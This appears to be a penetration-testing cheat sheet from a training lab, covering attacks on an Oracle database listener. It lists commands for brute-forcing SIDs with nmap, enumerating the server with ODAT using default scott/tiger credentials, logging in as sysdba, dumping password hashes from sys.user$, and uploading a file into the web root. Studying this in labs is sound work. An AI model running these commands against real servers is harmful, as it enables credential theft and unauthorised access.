## Nmap Scanning & SID Bruteforcing

```
sudo nmap -p1521 -sV 10.129.204.235 --open
```
    
Scans the default Oracle TNS listener port (1521) to identify the service version and verify if the port is open.
        
```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
    
Uses the `oracle-sid-brute` script to guess the System Identifiers (SIDs), which are unique names identifying a specific database instance required for a successful connection.

## ODAT (Oracle Database Attacking Tool) Enumeration

```
./odat.py -h
```
    
Displays the help menu for the ODAT tool to verify it was installed successfully.
        
```
./odat.py all -s 10.129.204.235
```
    
**Usage:** Runs all ODAT modules (`all`) to gather information, extract database names, running processes, user accounts, and valid credentials (e.g., `scott/tiger`).
        
```
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
    
**Usage:** Uses `sysdba` privileges to upload a local file (like `testing.txt`) to a specific path on the target server (e.g., the default web directory `C:\inetpub\wwwroot` on Windows).

## Service Interaction & Connection (SQL*Plus)
```
sqlplus -v
```
    
**Usage:** Checks the `sqlplus` tool version and ensures it runs without shared library errors.
        
```
sqlplus scott/tiger@10.129.204.235/XE
```
    
**Usage:** Connects to the Oracle database using the exact syntax: `username/password@IP/SID`.
        
```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
    
**Usage:** Attempts to log in with System Database Admin (`sysdba`) privileges, granting higher administrative access if the account holds that role.

## Database Enumeration (Inside SQL*Plus Shell)

```
select table_name from all_tables;
```
    
Lists all available tables within the current database.
        
```
select * from user_role_privs;
```
    
Displays the privileges and roles granted to the current user (useful to check for administrative rights).
        
```
select name, password from sys.user$;
```
    
**Usage:** Extracts usernames and password hashes from the `sys.user$` table for offline cracking.

## File Upload Verification

```
echo "Oracle File Upload Test" > testing.txt
```
    
**Usage:** Creates a simple local text file to test the upload process without triggering Antivirus alerts.
        
```
curl -X GET [http://10.129.204.235/testing.txt](http://10.129.204.235/testing.txt)
```
    
**Usage:** Sends a GET request to verify that the file was successfully uploaded to the web server's directory.

## Tools Installation & Setup (One-Time Configuration)

- **ODAT Setup:**
    
    - Install dependencies and cx_Oracle: 
```
sudo apt-get install -y build-essential python3-dev libaio1
wget [https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz](https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz)
tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
python3 setup.py build && sudo python3 setup.py install
```
        
Download and install ODAT: 
```
git clone [https://github.com/quentinhardy/odat.git](https://github.com/quentinhardy/odat.git) && cd odat/
pip install python-libnmap
git submodule init && git submodule update
```
        
- SQL*Plus Setup: 
    
Install package and fix library errors: 
```
sudo apt install oracle-instantclient-sqlplus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
